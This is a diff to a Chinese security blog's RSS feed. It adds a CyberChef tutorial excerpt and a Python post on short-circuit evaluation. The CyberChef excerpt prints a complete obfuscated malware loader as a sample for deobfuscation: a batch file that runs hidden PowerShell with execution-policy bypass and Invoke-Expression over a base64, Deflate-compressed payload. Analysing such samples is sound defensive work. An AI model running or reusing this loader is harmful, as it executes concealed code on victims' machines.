@@ -23,10 +23,10 @@
     
     <item>
       <title>越南方向海莲花APT攻击样本分析复现(一)</title>
-      <link>https://wander1ng.com/post/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</link>
+      <link>https://wander1ng.com/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</link>
       <pubDate>Wed, 10 Jul 2024 10:07:42 +0800</pubDate>
       
-      <guid>https://wander1ng.com/post/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</guid>
+      <guid>https://wander1ng.com/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</guid>
       <description></description>
     </item>
     
@@ -36,7 +36,58 @@
       <pubDate>Wed, 10 Jul 2024 10:05:48 +0800</pubDate>
       
       <guid>https://wander1ng.com/post/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%A5%9E%E5%99%A8cyberchef%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
-      <description></description>
+      <description>&lt;p&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;是一款强大的编码转换器，下载地址在&lt;/p&gt;
+&lt;p&gt;它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。&lt;/p&gt;
+&lt;p&gt;其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c556944c75a7b69779f8f7f469cef859.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;反混淆powershell代码&#34;&gt;反混淆Powershell代码&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@echo off
+if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command &amp;#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\&amp;#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\&amp;#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();&amp;#34;) else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command &amp;#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\&amp;#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\&amp;#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();&amp;#34;)
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>Python中的短路评估</title>
+      <link>https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/</link>
+      <pubDate>Tue, 09 Jul 2024 14:22:49 +0800</pubDate>
+      
+      <guid>https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/</guid>
+      <description>&lt;p&gt;在 Python 中，使用按位与运算符 &lt;code&gt;&amp;amp;&lt;/code&gt; 来连接多个条件在 if 语句中不是常见做法。如果你实际上是想判断多个布尔表达式的逻辑与，即 &lt;code&gt;a&lt;/code&gt;、&lt;code&gt;b&lt;/code&gt;、&lt;code&gt;c&lt;/code&gt; 都为真时执行某个代码块，那么你应该使用逻辑与 &lt;code&gt;and&lt;/code&gt; 运算符。&lt;/p&gt;
+&lt;h3 id=&#34;使用逻辑与-and-运算符&#34;&gt;使用逻辑与 &lt;code&gt;and&lt;/code&gt; 运算符&lt;/h3&gt;
+&lt;p&gt;当使用 &lt;code&gt;and&lt;/code&gt; 时，Python 会从左到右依次计算每个条件。如果其中任何一个条件为 &lt;code&gt;False&lt;/code&gt;，则整个表达式为 &lt;code&gt;False&lt;/code&gt;，并且后续的条件将不会被计算，程序直接跳到 &lt;code&gt;else&lt;/code&gt; 代码块。这种行为被称为 “短路” (short-circuit) 评估。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a = True
+b = False
+c = True
+
+if a and b and c:
+    print(&amp;#34;All conditions are True&amp;#34;)
+else:
+    print(&amp;#34;One or more conditions are False&amp;#34;)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这种情况下，由于 &lt;code&gt;b&lt;/code&gt; 是 &lt;code&gt;False&lt;/code&gt;，所以 &lt;code&gt;c&lt;/code&gt; 不会被计算，程序直接进入 &lt;code&gt;else&lt;/code&gt; 代码块，输出：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;One or more conditions are False
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用按位与--运算符&#34;&gt;使用按位与 &lt;code&gt;&amp;amp;&lt;/code&gt; 运算符&lt;/h3&gt;
+&lt;p&gt;按位与运算符 &lt;code&gt;&amp;amp;&lt;/code&gt; 对左右两边的操作数逐位执行按位与运算，不进行布尔运算。用于条件判断时，它会对所有操作数进行计算，而不会 “短路”。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a = True
+b = False
+c = True
+
+if a &amp;amp; b &amp;amp; c:
+    print(&amp;#34;All conditions are True&amp;#34;)
+else:
+    print(&amp;#34;One or more conditions are False&amp;#34;)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这种情况下，虽然 &lt;code&gt;b&lt;/code&gt; 是 &lt;code&gt;False&lt;/code&gt;，但 &lt;code&gt;a&lt;/code&gt;、&lt;code&gt;b&lt;/code&gt;、&lt;code&gt;c&lt;/code&gt; 都会被计算。因为 &lt;code&gt;b&lt;/code&gt; 为 &lt;code&gt;False&lt;/code&gt;，所以结果仍然是 &lt;code&gt;False&lt;/code&gt;， 程序会进入 &lt;code&gt;else&lt;/code&gt; 代码块，输出：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;One or more conditions are False
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;小结&#34;&gt;小结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;逻辑与 &lt;code&gt;and&lt;/code&gt;&lt;/strong&gt;: 如果任何一个条件为 &lt;code&gt;False&lt;/code&gt;，则不会计算后续条件，直接跳到 &lt;code&gt;else&lt;/code&gt;（短路评估）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;按位与 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/strong&gt;: 对所有条件进行位运算，不会短路。如果要判断多个布尔条件应使用 &lt;code&gt;and&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;总的来说，在逻辑判断中使用 &lt;code&gt;and&lt;/code&gt; 是更为合理和常见的做法，因为它能够利用短路评估来提高代码的效率。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if a and b and c:
+    # 执行所有条件都为真的情况
+    ...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这会在找到第一个 &lt;code&gt;False&lt;/code&gt; 时立即停止后续的判断，从而提高代码效率。&lt;/p&gt;
+</description>
     </item>
     
     <item>
